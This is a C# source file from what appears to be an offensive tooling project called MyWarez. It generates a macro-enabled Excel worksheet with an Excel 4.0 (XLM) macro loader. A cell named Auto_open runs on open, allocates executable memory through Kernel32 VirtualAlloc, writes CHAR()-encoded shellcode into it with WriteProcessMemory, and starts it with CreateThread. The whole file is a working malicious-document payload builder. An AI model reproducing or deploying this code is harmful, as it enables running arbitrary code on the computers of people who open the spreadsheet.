using System;
using System.Linq;

using MyWarez.Core;

namespace MyWarez.Payloads
{
    public sealed class ShellcodeXlmMacro : ExcelWorksheet
    {
        public ShellcodeXlmMacro(IShellcode shellcode) : base(ShellCodeToCellMatrix(EncodeShellcode(shellcode)), macroEnabled: true) { }
        public ShellcodeXlmMacro(byte[] shellCode) : base(ShellCodeToCellMatrix(shellCode), macroEnabled: true) { }
        private static ShellcodeArch[] ValidShellcodeArchs = new ShellcodeArch[] { ShellcodeArch.x86, ShellcodeArch.x84 };
        private static byte[] BadChars = new byte[] { 0 };
        private static byte[] EncodeShellcode(IShellcode shellcode)
        {
            if (!ValidShellcodeArchs.Contains(shellcode.Arch))
                throw new ArgumentException();

            return Utils.EncodeShellcode(shellcode.Bytes, shellcode.Arch, BadChars);
        }
        private static ExcelCellMatrix ShellCodeToCellMatrix(byte[] shellCode)
        {
            var loader = new ExcelCell[]
            {
                new ExcelCell(@"=R1C2()"),
                new ExcelCell(@"=CALL(""Kernel32"",""VirtualAlloc"",""JJJJJ"",0,1000000,4096,64)"),
                new ExcelCell(@"=SELECT(R1C2:R1000:C2,R1C2)"),
                new ExcelCell(@"=SET.VALUE(R1C3, 0)"),
                new ExcelCell(@"=WHILE(LEN(ACTIVE.CELL())>0)"),
                new ExcelCell(@"=CALL(""Kernel32"",""WriteProcessMemory"",""JJJCJJ"",-1, R2C1 + R1C3 * 20,ACTIVE.CELL(), LEN(ACTIVE.CELL()), 0)"),
                new ExcelCell(@"=SET.VALUE(R1C3, R1C3 + 1)"),
                new ExcelCell(@"=SELECT(, ""R[1]C"")"),
                new ExcelCell(@"=NEXT()"),
                new ExcelCell(@"=CALL(""Kernel32"",""CreateThread"",""JJJJJJJ"",0, 0, R2C1, 0, 0, 0)"),
                new ExcelCell(@"=HALT()"),
            };

            int shellcodeChunkSize = 20;
            int numShellcodeChunks = (int)Math.Ceiling(shellCode.Length / (double)shellcodeChunkSize);
            var numRows = Math.Max(loader.Length, 1 + numShellcodeChunks);
            ExcelCell[][] cells = new ExcelCell[numRows][];
            var loaderCol = 0;
            var shellcodeCol = 1;
            var initR = 0;
            var r = initR;
            var c = loaderCol;
            foreach (var cell in loader)
            {
                cells[r] = new ExcelCell[Math.Max(loaderCol, shellcodeCol) + 1];
                var macro = cell.Value;
                if (r == initR)
                {
                    cells[r][c] = new ExcelCell(value: macro, name: "Auto_open");
                }
                else
                {
                    cells[r][c] = new ExcelCell(value: macro);
                }
                r++;
            }

            r = initR;
            c = shellcodeCol;

            byte[][] shellcodeChunks = new byte[numShellcodeChunks][];
            for (int i = 0; i < shellcodeChunks.Length; i++)
            {
                shellcodeChunks[i] = shellCode.Skip(i * shellcodeChunkSize).Take(shellcodeChunkSize).ToArray();
            }

            foreach (var chunk in shellcodeChunks)
            {
                if (cells[r] == null)
                    cells[r] = new ExcelCell[Math.Max(loaderCol, shellcodeCol) + 1];

                var macro = "=" + string.Join("&", chunk.Select(b => string.Format("CHAR({0})", (int)b)).ToList());
                cells[r][c] = new ExcelCell(value: macro);
                r++;
            }
            if (cells[r] == null)
                cells[r] = new ExcelCell[Math.Max(loaderCol, shellcodeCol) + 1];
            cells[r][c] = new ExcelCell(value: "=RETURN()");

            return new ExcelCellMatrix(cells);
        }
    }
}
